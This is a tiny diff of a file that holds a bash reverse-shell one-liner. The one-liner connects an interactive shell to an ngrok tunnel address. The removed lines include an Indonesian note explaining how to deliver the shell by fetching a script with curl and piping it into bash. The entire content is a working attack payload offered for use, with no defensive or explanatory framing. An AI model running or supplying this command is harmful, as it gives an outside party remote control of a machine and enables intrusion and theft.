@@ -1,3 +1,1 @@
-sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/19338 0>&1 ;
-
-jika ingin menjalankan menjalankan melalui curl --> curl -s url.com/revshellbash.txt | bash
+sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/19338 0>&1
